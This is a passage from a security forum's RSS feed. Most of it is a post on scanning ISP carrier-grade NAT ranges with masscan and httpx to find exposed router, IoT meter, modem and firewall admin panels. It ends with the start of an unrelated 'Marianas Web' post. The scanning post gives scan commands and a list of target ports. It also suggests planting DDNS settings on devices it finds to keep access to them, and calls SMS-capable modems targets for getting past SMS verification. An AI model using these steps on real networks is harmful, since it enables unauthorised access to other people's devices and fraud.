</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/f/dfb65d87b067166f03487b4c45e4982d7cf0225d.png" data-download-href="/uploads/short-url/vV3bTyZzZvbCscIJGtHgMi4n8Jf.png?dl=1" title="CGNAT"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb65d87b067166f03487b4c45e4982d7cf0225d_2_489x375.png" alt="CGNAT" data-base62-sha1="vV3bTyZzZvbCscIJGtHgMi4n8Jf" width="489" height="375" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb65d87b067166f03487b4c45e4982d7cf0225d_2_489x375.png, https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb65d87b067166f03487b4c45e4982d7cf0225d_2_733x562.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/f/dfb65d87b067166f03487b4c45e4982d7cf0225d.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb65d87b067166f03487b4c45e4982d7cf0225d_2_10x10.png"></a></div><p></p>
</li>
</ul>
<blockquote>
<p><em>Note the 100.xx.xx.xx shared address being used in the WAN</em></p>
</blockquote>
<h3>
<a name="our-business-with-the-shared-address-space-isp-wans-3" class="anchor" href="https://0x00sec.org#our-business-with-the-shared-address-space-isp-wans-3"></a>Our Business with the shared address space / ISP WANs</h3>
<p>Now you might ask, why exactly are we interested in this shared address space? well everybody scans LANs and shodan scans the internet, dont you think WANs should recieve fair treatment as well <img src="https://0x00sec.org/images/emoji/twitter/thinking.png?v=9" title=":thinking:" class="emoji" alt=":thinking:"> ?</p>
<p>Here are a few reasons why ISP WANs should be explored :</p>
<ol>
<li>
<p>WANs are special because they contain a lot of devices which are otherwise not reachable from the internet due to CGNAT , these might include poorly configured routers ,ISPs router firmware upgrade servers etc.</p>
</li>
<li>
<p>WANs of Mobile Network provider are especially interesting , as many embedded devices<br>
use them , examples of such devices could be street light systems, traffic controllers, customer modems etc.</p>
</li>
<li>
<p>WANs present a unexplored landscape where you are more likely to discover something exciting.</p>
</li>
</ol>
<h3>
<a name="getting-down-to-business-4" class="anchor" href="https://0x00sec.org#getting-down-to-business-4"></a>Getting Down to Business</h3>
<p><em><strong>Tools of trade</strong></em> : Ive been a long time admirer of masscan, its a stable scanning solution , but recent experience with <a href="https://github.com/RustScan/RustScan">rustscan</a> has also been very good , i find it to be faster than masscan, you can choose whatever suits you.</p>
<p><em><strong>Finding the right range to scan</strong></em> : Mobile ISP tend to use the shared address space 100.64.0.0/10 , while broadband ISPs are more likely to use private ranges such as 172.16.0.0/12 or 10.0.0.0/8, in either case these are very large ranges to scan, in case of broadband ISPs you can visit you routers page to find your WAN address , in case of mobile ISPs you can visit your phones ‘about’ section in settings to find your IP/WAN address, if your using a modem ifconfig should do the trick.</p>
<blockquote>
<p>Note : not all ISPs employ CGNAT , dont be surprised if you see a public address in place of your WAN address</p>
</blockquote>
<p><em><strong>Scanning Smartly</strong></em> : Like i have previously mentioned ip ranges used for WAN are large, instead of wasting time scanning the entire range you can you the following trick , lets say your WAN address is 10.27.27.123, you could scan the subnet 10.27.0.0/16 since you were assigned a address in this range, it is likely that other devices exist in the same range, you could also scan subsequent ranges such as 10.28.0.0/16, 10.29.0.0/16 and so forth as it is very likely that ISP uses these (masscan automatically does this), another neat trick is case of mobile ISPs is to continuously connect and disconnect from the network while noting down your WAN address each time, this should give you a good idea of the subnets your ISP uses.</p>
<blockquote>
<p>Note : Its likely devices you find in WANs will change their addresses from time to time , especially in case of mobile networks , its thus advisable to scan smaller ip block and immediately analyze the results.</p>
</blockquote>
<blockquote>
<p>Note : In a few cases you might be able to reach a few not so obvious private ranges which your ISP might be using, for example lets say your WAN address is 100.90.1.27, you would assume that your ISP only uses the shared address space 100.64.0.0/10, but this is not always the case, you may be able to reach devices in the subnets 172.16.0.0/12 or 10.0.0.0/8, a random scan of these address space might reveal interesting targets, performing a traceroute to a internet address(say 8.8.8.8) can also reveal the use of such alternate WAN address spaces.</p>
</blockquote>
<p><em><strong>Scanning and analyzing devices</strong></em> :</p>
<ul>
<li>Scanning with masscan :<br>
<code>sudo masscan -p80 100.99.0.0/16 2&gt; /dev/null | tee results.txt</code><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/b/4b7eefce2e27aa94502f7297f0a22f54e11abf8d.png" data-download-href="/uploads/short-url/aLRLNHz8p8H169T6ywJJP0g3soB.png?dl=1" title="masscan"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/b/4b7eefce2e27aa94502f7297f0a22f54e11abf8d_2_517x265.png" alt="masscan" data-base62-sha1="aLRLNHz8p8H169T6ywJJP0g3soB" width="517" height="265" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/b/4b7eefce2e27aa94502f7297f0a22f54e11abf8d_2_517x265.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/b/4b7eefce2e27aa94502f7297f0a22f54e11abf8d_2_775x397.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/b/4b7eefce2e27aa94502f7297f0a22f54e11abf8d.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/b/4b7eefce2e27aa94502f7297f0a22f54e11abf8d_2_10x10.png"></a></div>
</li>
</ul>
<blockquote>
<p>Note: piping masscans error stream to /dev/null hides its status messages so that you can get a clean output file , although masscan does support the ‘-oL’ option like nmap for output, the above approach shows you ips discovered in realtime and also saves them in the result file, while the ‘-oL’ option requires you wait untill the whole scan is complete in order to view the results.</p>
</blockquote>
<blockquote>
<p>Note: if you are using a modem and masscan timesout with a ARP resolve error, specify the MAC address of your modem using the --router-mac=aa:bb:cc:dd:ee:ff option.</p>
</blockquote>
<blockquote>
<p>Note: you can save time by increasing packet rate of masscan using --rate option , --rate=300 is a good rate for 4G mobile networks , broadband users can rise it even higher , but be mindful of the packet rate, very high packet rate can negatively affect device discovery probability.</p>
</blockquote>
<ul>
<li>
<p>Analyzing results:  since we scanned for port 80, we can use httpx to look for interesting targets.</p>
<ul>
<li>
<p>Picking ips from the results file<br>
<code>cat results.txt | cut -f6 -d' ' &gt; ip.txt</code></p>
</li>
<li>
<p>Probing targets with httpx<br>
<code>httpx -status-code -title -l ip.txt</code><br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/d/edefb59d5372b9a367fc7e76804bb4c25c2cbf7c.png" data-download-href="/uploads/short-url/xWSJBADP9MZ6Gm3Hk18cRGrXKNe.png?dl=1" title="httpx"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/d/edefb59d5372b9a367fc7e76804bb4c25c2cbf7c_2_517x290.png" alt="httpx" data-base62-sha1="xWSJBADP9MZ6Gm3Hk18cRGrXKNe" width="517" height="290" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/d/edefb59d5372b9a367fc7e76804bb4c25c2cbf7c_2_517x290.png, https://0x00sec.s3.amazonaws.com/optimized/3X/e/d/edefb59d5372b9a367fc7e76804bb4c25c2cbf7c_2_775x435.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/d/edefb59d5372b9a367fc7e76804bb4c25c2cbf7c.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/e/d/edefb59d5372b9a367fc7e76804bb4c25c2cbf7c_2_10x10.png"></a></div><p></p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>Note: while i have choosen to target web based services(port 80) here, you can modify your scan to include ssh and telnet ports, which perhaps will yield more interesting results.</p>
</blockquote>
<p><em><strong>Recommended ports for scanning</strong></em> :</p>
<div class="md-table">
<table>
<thead>
<tr>
<th style="text-align:center"><strong>Port</strong></th>
<th style="text-align:center"><strong>Type</strong></th>
<th style="text-align:center"><strong>Service</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">80</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">HTTP</td>
</tr>
<tr>
<td style="text-align:center">8000</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">HTTP ALT</td>
</tr>
<tr>
<td style="text-align:center">9000</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">HTTP ALT</td>
</tr>
<tr>
<td style="text-align:center">8080</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">HTTP ALT</td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">FTP</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">SSH</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">Telnet</td>
</tr>
<tr>
<td style="text-align:center">502</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">ModBus</td>
</tr>
<tr>
<td style="text-align:center">5555</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">ADB</td>
</tr>
</tbody>
</table>
</div><br>
<p><em><strong>Persistant Access / Device Rediscovery</strong></em> : Devices on WANs can change their ip address unpredictably , this can happen due to power outage, network disconnection etc, this is more wide spread in case of Mobile Networks, its a pain to re-scan an entire network range to find a particular device you are interested in, in such cases you can leverage  <a href="https://en.wikipedia.org/wiki/Dynamic_DNS">DDNS</a> settings which many devices offer, you can create an free account on <a href="https://www.noip.com/">NoIp</a> (upto 3 devices) and setup the DDNS service on the device, so everytime a device changes its WAN address it will update the corresponding DDNS hostname accordingly , you’ll just have to resolve your DDNS hostname to find its WAN address.</p>
<blockquote>
<p>Note: If you are confused as to why a DDNS client would update its WAN address instead of its public address to the DDNS server, DDNS client works by checking the WAN interfaces ip address, it does not attempt to determine its actual public ip address, in its point of view the address assigned to the WAN interface is globally routable.</p>
</blockquote>
<p><em><strong>Results</strong></em> :  Lets take a look what we managed to find</p>
<p><em>strange routers that i have never seen before</em> :</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/e/bed7d48101bcfae9cfc7d8e6b7530f903005d03f.png" data-download-href="/uploads/short-url/reh8g7Xv3FBLkmQRMgheLE81OlF.png?dl=1" title="hp"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/e/bed7d48101bcfae9cfc7d8e6b7530f903005d03f_2_517x242.png" alt="hp" data-base62-sha1="reh8g7Xv3FBLkmQRMgheLE81OlF" width="517" height="242" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/e/bed7d48101bcfae9cfc7d8e6b7530f903005d03f_2_517x242.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/e/bed7d48101bcfae9cfc7d8e6b7530f903005d03f_2_775x363.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/b/e/bed7d48101bcfae9cfc7d8e6b7530f903005d03f_2_1034x484.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/b/e/bed7d48101bcfae9cfc7d8e6b7530f903005d03f_2_10x10.png"></a></div><br>
<br><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/4/b43b5ff9a32a3cdbadbbee9f48e4c2a163b2f4dd.png" data-download-href="/uploads/short-url/pIp9B8O3JJiLM5BVS4taNNVEF3f.png?dl=1" title="four-faith"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/4/b43b5ff9a32a3cdbadbbee9f48e4c2a163b2f4dd_2_474x375.png" alt="four-faith" data-base62-sha1="pIp9B8O3JJiLM5BVS4taNNVEF3f" width="474" height="375" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/4/b43b5ff9a32a3cdbadbbee9f48e4c2a163b2f4dd_2_474x375.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/4/b43b5ff9a32a3cdbadbbee9f48e4c2a163b2f4dd_2_711x562.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/b/4/b43b5ff9a32a3cdbadbbee9f48e4c2a163b2f4dd_2_948x750.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/b/4/b43b5ff9a32a3cdbadbbee9f48e4c2a163b2f4dd_2_10x10.png"></a></div><br>
<br><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/7/4749005d91018481bf630b93b1077ef760ecec06.png" data-download-href="/uploads/short-url/aaCiVl6f8HjX3qDua2DTHTu5B1s.png?dl=1" title="nirad"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/4749005d91018481bf630b93b1077ef760ecec06_2_517x309.png" alt="nirad" data-base62-sha1="aaCiVl6f8HjX3qDua2DTHTu5B1s" width="517" height="309" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/4749005d91018481bf630b93b1077ef760ecec06_2_517x309.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/4749005d91018481bf630b93b1077ef760ecec06_2_775x463.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/4749005d91018481bf630b93b1077ef760ecec06_2_1034x618.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/4749005d91018481bf630b93b1077ef760ecec06_2_10x10.png"></a></div><p></p>
<p><em><strong>IOT devices</strong></em><br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a018db10b1475477b2930d5ccc2597289e8e228.png" data-download-href="/uploads/short-url/f7LWi5m6ylQCLPFTIzUQZbZLIOA.png?dl=1" title="cmd-meter"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a018db10b1475477b2930d5ccc2597289e8e228_2_517x261.png" alt="cmd-meter" data-base62-sha1="f7LWi5m6ylQCLPFTIzUQZbZLIOA" width="517" height="261" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a018db10b1475477b2930d5ccc2597289e8e228_2_517x261.png, https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a018db10b1475477b2930d5ccc2597289e8e228_2_775x391.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a018db10b1475477b2930d5ccc2597289e8e228_2_1034x522.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a018db10b1475477b2930d5ccc2597289e8e228_2_10x10.png"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/e/2e4765ff8c4f958b02cac0730848fbd6807f60d0.png" data-download-href="/uploads/short-url/6BoVUzGzlxOR8nWglwESRyydwn6.png?dl=1" title="wattmon"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/e/2e4765ff8c4f958b02cac0730848fbd6807f60d0_2_690x280.png" alt="wattmon" data-base62-sha1="6BoVUzGzlxOR8nWglwESRyydwn6" width="690" height="280" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/e/2e4765ff8c4f958b02cac0730848fbd6807f60d0_2_690x280.png, https://0x00sec.s3.amazonaws.com/optimized/3X/2/e/2e4765ff8c4f958b02cac0730848fbd6807f60d0_2_1035x420.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/2/e/2e4765ff8c4f958b02cac0730848fbd6807f60d0_2_1380x560.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/e/2e4765ff8c4f958b02cac0730848fbd6807f60d0_2_10x10.png"></a></div><p></p>
<p><em><strong>subscriber modems</strong></em><br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/d/5d4a91871327c4550a331e62fb320b9ecbc4f4ed.png" data-download-href="/uploads/short-url/djialMkRU2Zb7JJZ29dXOYE8TX7.png?dl=1" title="digisol"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d4a91871327c4550a331e62fb320b9ecbc4f4ed_2_517x259.png" alt="digisol" data-base62-sha1="djialMkRU2Zb7JJZ29dXOYE8TX7" width="517" height="259" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d4a91871327c4550a331e62fb320b9ecbc4f4ed_2_517x259.png, https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d4a91871327c4550a331e62fb320b9ecbc4f4ed_2_775x388.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d4a91871327c4550a331e62fb320b9ecbc4f4ed_2_1034x518.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d4a91871327c4550a331e62fb320b9ecbc4f4ed_2_10x10.png"></a></div><br>
<br><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/f/4f3066efe8fb0cc3ab532ccf2e4b4669ec576588.png" data-download-href="/uploads/short-url/bixq71CRGVq5ZZ0zskItHbL7gb6.png?dl=1" title="enter"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/f/4f3066efe8fb0cc3ab532ccf2e4b4669ec576588_2_517x242.png" alt="enter" data-base62-sha1="bixq71CRGVq5ZZ0zskItHbL7gb6" width="517" height="242" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/f/4f3066efe8fb0cc3ab532ccf2e4b4669ec576588_2_517x242.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/f/4f3066efe8fb0cc3ab532ccf2e4b4669ec576588_2_775x363.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/4/f/4f3066efe8fb0cc3ab532ccf2e4b4669ec576588_2_1034x484.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/f/4f3066efe8fb0cc3ab532ccf2e4b4669ec576588_2_10x10.png"></a></div><br>
<br><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/5/d5d39cf087616b1bd9209f7d5b628c81aca8b1f2.png" data-download-href="/uploads/short-url/uvB4XLujf871YGnrMCbeolywU2m.png?dl=1" title="techie"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/5/d5d39cf087616b1bd9209f7d5b628c81aca8b1f2_2_517x333.png" alt="techie" data-base62-sha1="uvB4XLujf871YGnrMCbeolywU2m" width="517" height="333" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/5/d5d39cf087616b1bd9209f7d5b628c81aca8b1f2_2_517x333.png, https://0x00sec.s3.amazonaws.com/optimized/3X/d/5/d5d39cf087616b1bd9209f7d5b628c81aca8b1f2_2_775x499.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/d/5/d5d39cf087616b1bd9209f7d5b628c81aca8b1f2_2_1034x666.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/d/5/d5d39cf087616b1bd9209f7d5b628c81aca8b1f2_2_10x10.png"></a></div><p></p>
<p><em><strong>firewalls</strong></em><br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/b/fbb7e57dc906e6588085df7324f560b9f2b55902.png" data-download-href="/uploads/short-url/zUNQanNv9rwWRlwd10qmoCw1Usy.png?dl=1" title="juniper"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/b/fbb7e57dc906e6588085df7324f560b9f2b55902_2_491x375.png" alt="juniper" data-base62-sha1="zUNQanNv9rwWRlwd10qmoCw1Usy" width="491" height="375" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/b/fbb7e57dc906e6588085df7324f560b9f2b55902_2_491x375.png, https://0x00sec.s3.amazonaws.com/optimized/3X/f/b/fbb7e57dc906e6588085df7324f560b9f2b55902_2_736x562.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/b/fbb7e57dc906e6588085df7324f560b9f2b55902.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/f/b/fbb7e57dc906e6588085df7324f560b9f2b55902_2_10x10.png"></a></div><br>
<br><br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/4/a4301662027d62d1bf79efa19a2fff587d727790.png" data-download-href="/uploads/short-url/nqtkAdMq5kKaHmNAsj8VS9xcwes.png?dl=1" title="dell"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/a/4/a4301662027d62d1bf79efa19a2fff587d727790_2_517x358.png" alt="dell" data-base62-sha1="nqtkAdMq5kKaHmNAsj8VS9xcwes" width="517" height="358" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/a/4/a4301662027d62d1bf79efa19a2fff587d727790_2_517x358.png, https://0x00sec.s3.amazonaws.com/optimized/3X/a/4/a4301662027d62d1bf79efa19a2fff587d727790_2_775x537.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/a/4/a4301662027d62d1bf79efa19a2fff587d727790.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/a/4/a4301662027d62d1bf79efa19a2fff587d727790_2_10x10.png"></a></div><p></p>
<blockquote>
<p>Note: ‘TCCC’ stands for ‘The Coca Cola Company’ (no im not kidding <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"> )</p>
</blockquote>
<h3>
<a name="observations-5" class="anchor" href="https://0x00sec.org#observations-5"></a>Observations</h3>
<ul>
<li>Firstly we notice a variety of <em><strong>routers</strong></em> whose administration panels are accessible from the WAN network,this is often the result of misconfiguring the http service to listen on all interfaces, the absence of routers manufactured by popular vendors in our results tells us that such a misconfiguration is rather the trait of uncommon and shady vendors, if one finds routers from such vendors in large numbers it is likely that the ISP is distributing them, for they are cheaper than regular routers.<br>
<br>
</li>
<li>
<em><strong>IOT devices</strong></em> : we come across the administrative interface of a very interesting device which seems to be an electric meter(how do i know ?, i checked the vendors website)(the other screenshot is of a controller of modbus devices), the sheer nature of such devices requires them to use mobile networks for connectivity, in which case its obvious that there does not exist any router/intermediate device between such a IOT device and the ISPs router , this combined with the fact that it exposes a administrative interface (most likely by default) yet again confirms the infamous security posture of IOT devices. Like a good friend of mine once said “The ‘S’ in IOT stands for Security”. WANs in near future(if not already) will be gold mines of IOT devices which depend on mobile networks.<br>
<br>
</li>
<li>
<em><strong>Subscriber modems</strong></em> are the devices you are most likely to run into when scanning mobile ISP WANs, it does not always have to be those old-fashioned data cards , there are also devices such as these (a travel modem)<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/2/9/29e774559db0ff1451748f5b1718684b8e9fed5e.jpeg" alt="tplink" data-base62-sha1="5YHsPVhc1NvcQz1PUoiothpNdx4" width="273" height="223"><br>
only devices such as these and datacards(ones with wifi) have web based administrative interfaces. These devices are fascinating because of their capability to send and recieve SMS messages, many services on the internet requires SMS verification (example: <a href="https://hunter.io">hunter.io</a>) to prevent fraud , these services can also detect disposable phone numbers and VOIP numbers which leaves attackers without much choice, in such cases these modems become lucrative targets.</li>
</ul>
<blockquote>
<p>Note: one can determine a modems phone number by running a operator specific <a href="https://en.wikipedia.org/wiki/Unstructured_Supplementary_Service_Data">USSD</a> code, some operators have a SMS based service wherein they send back the phone number when you send a SMS to specific service number, in other cases one can check the SMS archive of the modem, some messages from operators might contain the phone number.</p>
</blockquote>
<ul>
<li>Dicovering Firewalls on broadband ISP WANs are pretty common , but i found a few on a mobile ISPs network , after some research i found that many enterprise grade firewalls have a so called ‘fail safe’ mode wherein you connect a modem to the firewall which makes it accessible even when all wired internet connections fail.<br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/b/7b1d7fe7ca3a8278fdce9a9e30946d79f4d38fb9.jpeg" data-download-href="/uploads/short-url/hz7VKOdQEoAqtSejjz10oV1FGml.jpeg?dl=1" title="checkpoint-min"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7b1d7fe7ca3a8278fdce9a9e30946d79f4d38fb9_2_517x358.jpeg" alt="checkpoint-min" data-base62-sha1="hz7VKOdQEoAqtSejjz10oV1FGml" width="517" height="358" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7b1d7fe7ca3a8278fdce9a9e30946d79f4d38fb9_2_517x358.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7b1d7fe7ca3a8278fdce9a9e30946d79f4d38fb9_2_775x537.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7b1d7fe7ca3a8278fdce9a9e30946d79f4d38fb9_2_1034x716.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7b1d7fe7ca3a8278fdce9a9e30946d79f4d38fb9_2_10x10.png"></a></div>
</li>
</ul>
<h3>
<a name="limitations-6" class="anchor" href="https://0x00sec.org#limitations-6"></a>Limitations</h3>
<ul>
<li>
<p>Like i have previously mentioned, not all ISP have CGNATS<br>
in such cases there is not much you can do.</p>
</li>
<li>
<p>A WAN network usually contains users of a particular area or a city, there may not be too many devices sometimes</p>
</li>
<li>
<p>Some ISPs prevent communication between devices in a WAN (i’m not sure how effective this actually is)</p>
</li>
<li>
<p>Interacting with devices on a WAN (especially on mobile networks) is extremely slow sometimes.</p>
</li>
</ul>
<h3>
<a name="references-7" class="anchor" href="https://0x00sec.org#references-7"></a>References</h3>
<ul>
<li><a href="https://en.wikipedia.org/wiki/IPv4_shared_address_space">IPv4_shared_address_space</a></li>
<li><a href="https://datatracker.ietf.org/doc/rfc6598/?include_text=1">rfc6598</a></li>
<li><a href="https://en.wikipedia.org/wiki/Carrier-grade_NAT">Carrier-grade_NAT</a></li>
<li><a href="https://en.wikipedia.org/wiki/Unstructured_Supplementary_Service_Data">USSD</a></li>
<li><a href="https://en.wikipedia.org/wiki/Dynamic_DNS">Dynamic_DNS</a></li>
</ul>
<h3>
<a name="tools-8" class="anchor" href="https://0x00sec.org#tools-8"></a>Tools:</h3>
<ul>
<li><a href="https://github.com/RustScan/RustScan">RustScan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">Masscan</a></li>
</ul>
<h3>
<a name="further-reading-9" class="anchor" href="https://0x00sec.org#further-reading-9"></a>Further Reading:</h3>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Network_address_translation">Network_address_translation</a></li>
<li><a href="https://www.cisco.com/c/en/us/products/switches/what-is-a-wan-wide-area-network.html">WANs by CISCO</a></li>
<li><a href="https://www.checkpoint.com/cyber-hub/network-security/what-is-sd-wan/benefits-of-sd-wan/">The Benefits of SD-WAN</a></li>
<li><a href="https://tools.ietf.org/html/rfc7021">Assessing the Impact of Carrier-Grade NAT on<br>
Network Applications</a></li>
<li><a href="https://www.donaldsimpson.co.uk/2016/10/24/tunneling-out-of-carrier-grade-nat-cgnat-with-ssh-and-aws/">Tunneling out of Carrier Grade Nat (CGNAT) with SSH and AWS | Don’s Blog</a></li>
</ul>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/scanning-wans-and-stalking-strange-devices/26374">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/scanning-wans-and-stalking-strange-devices/26374</link>
          <pubDate>Sun, 20 Jun 2021 10:58:02 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26374</guid>
          <source url="https://0x00sec.org/t/scanning-wans-and-stalking-strange-devices/26374.rss">Scanning WAN&#39;s and Stalking strange devices</source>
        </item>
        <item>
          <title>&gt; What is &quot;Marianas Web&quot;? / How does it work? / How to Access? / The Most Accurate Expression</title>
          <dc:creator><![CDATA[3vn2odzn]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/d/5de600a6fbd5bf07c892632e7765fb101b1b87c9.jpeg" data-download-href="/uploads/short-url/doFbldh67HHHxHvN1h8huvZBSFX.jpeg?dl=1" title="what-is-marianas-web-3vn2odzn" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5de600a6fbd5bf07c892632e7765fb101b1b87c9_2_690x388.jpeg" alt="what-is-marianas-web-3vn2odzn" data-base62-sha1="doFbldh67HHHxHvN1h8huvZBSFX" width="690" height="388" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5de600a6fbd5bf07c892632e7765fb101b1b87c9_2_690x388.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5de600a6fbd5bf07c892632e7765fb101b1b87c9_2_1035x582.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5de600a6fbd5bf07c892632e7765fb101b1b87c9_2_1380x776.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5de600a6fbd5bf07c892632e7765fb101b1b87c9_2_10x10.png"></a></div><p></p>
<p>Hello! In this respect; I explained what the structure known as the “Marianas Web”, which has so many legends and nonsense on the Internet, really is.</p>
<p><strong>But before I get to the subject, I want to make a warning. The expressions you read in this article may not be fully compatible with English. I am Turkish. And sometimes I am not able to get English expressions quite right. I am trying to improve my English. Sorry if you see incorrect statements.</strong></p>
<p>Now we can move on to the subject. By researching this issue for a total of 4 months, I was able to reach the correct results. Sorry, you have too much misinformation on the internet. But I am sure that this article you are reading is the only correct information on the internet.</p>
<p>Actually there is no such thing as MarianasWeb. But the common name people put on secret networks is MarianasWeb. That’s why in this article I will refer to it as MarianasWeb.</p>
<hr>
<p><strong>This article consists of 5 sections in total:</strong></p>
<p>• How Does Marianas Web Work? Technically What Is Its Logic? How To Build A Structure In This Way?</p>
<p>•  How to Access MarianasWeb?</p>
